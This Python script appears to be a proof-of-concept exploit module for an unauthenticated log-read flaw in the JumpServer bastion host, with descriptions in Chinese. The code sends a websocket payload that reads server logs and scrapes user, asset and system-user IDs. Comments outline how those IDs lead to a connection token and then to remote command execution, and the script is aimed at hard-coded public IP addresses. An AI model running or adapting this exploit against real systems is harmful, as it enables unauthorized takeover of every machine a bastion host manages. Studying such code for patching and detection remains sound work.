# coding:utf-8
import asyncio
import re
import time
import websockets
import json

      
class c2Class(object):
    def __init__(self):
        self.vulname = 'JumpServer Log Read'
        self.vulsystem= 'JumpServer'
        self.vulsystemintro = 'JumpServer 是全球首款完全开源的堡垒机（是一类可作为跳板批量操作远程设备的网络设备，是系统管理员或运维人员常用的操作平台之一）'\
        '，使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。JumpServer 使用Python / Django 进行开发。'
        self.vuldesc='由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取敏感信息，进而执行相关操作控制其中所有机器，执行任意命令。'
        self.vulversion = '<v2.6.2; <v2.5.4; <v2.4.5; =v1.5.9 '
        self.fofa='JumpServer' # 或者 app="FIT2CLOUD-JumpServer-堡垒机"
        self.findtime='2021-1-15'
        self.refer= 'https://github.com/Skactor/jumpserver_rce\nhttps://s.tencent.com/research/bsafe/1228.html\nhttps://github.com/jumpserver/jumpserver/blob/master/README.md'
        self.pyv=3
        self.testisok=True

        self.vulpath='/ws/ops/tasks/log/'
        self.payload='{"task":"/opt/jumpserver/logs/jumpserver"}'
        # self.payload2='{"task": "//opt/jumpserver/logs/gunicorn"}'
        self.rc_user_id=re.compile(r'(?<=user_id=)[a-z-0-9\-]{36}')
        self.rc_asset_id=re.compile(r'(?<=asset_id=)[a-z-0-9\-]{36}')
        self.rc_system_user_id=re.compile(r'(?<=system_user_id=)[a-z-0-9\-]{36}')

    async def main_logic(self,t):
        state=0
        text=''
        # print("#######start ws")
        async with websockets.connect(t) as client:
            await client.send(self.payload)
            i=2
            # while 1:
            #     ret = json.loads(await client.recv())
            #     print(ret)
            while i:
                # print(i)
                ret = json.loads(await client.recv())['message']
                # print(len(ret))
                fu=self.rc_user_id.findall(ret)
                fa=self.rc_asset_id.findall(ret)
                fs=self.rc_system_user_id.findall(ret)
                if fu!=['']:
                    for i in fu:
                        text+='[user_id:%s]'%i
                if fa!=['']:
                    for i in fa:
                        text+='[asset_id:%s]'%i
                if fs!=['']:
                    for i in fs:
                        text+='[system_user_id:%s]'%i
                if text!='':
                    pass
                    # print('[!]%s data: %s'%(t,text))
                # [!] 
                # 如果找到了user_id、asset_id、system_user_id，
                # 就可以进一步获取临时token（requests.post(host+'/api/v1/authentication/connection-token/?user-only=1', json=data) data={'user':user_id,'asset':asset_id,'system_user':system_user_id}）
                # /api/v1/authentication/connection-token/?user-only=1 或者可以为 /api/v1/users/connection-token/?user-only=1
                # 接着利用token进行ws下的远程命令执行了（ws://xxx.xxx.xxxx/koko/ws/token/?target_id={token}）
                i-=1
                state=1
            return state,text
            # print('[!]%s can read log'%t)

    def c2Func(self,target):
        status=0
        returnData=''
        text=''
        try:
            host = target.strip('/')
            wstarget = host.replace("https://", "wss://").replace("http://", "ws://")+self.vulpath
            # https://www.cnblogs.com/SunshineKimi/p/12053914.html
            new_loop=asyncio.new_event_loop()
            asyncio.set_event_loop(new_loop)
            loop=asyncio.get_event_loop()
            get_future = asyncio.ensure_future(self.main_logic(wstarget))
            loop.run_until_complete(get_future)
            status,text=get_future.result()
            returnData='%s is vlun(%s), vulpath:%s reqdata:%s.'\
                        'now find id:[%s]'%(target,self.vulname,wstarget,str(self.payload),text) #
        except Exception as e:
            # print(e)
            returnData=str(e)
        return status,returnData

if __name__ == '__main__':
    target='http://54.168.61.29:8080/'
    # target='http://101.226.168.75:8888'
    pocObj=c2Class()
    print(pocObj.c2Func(target))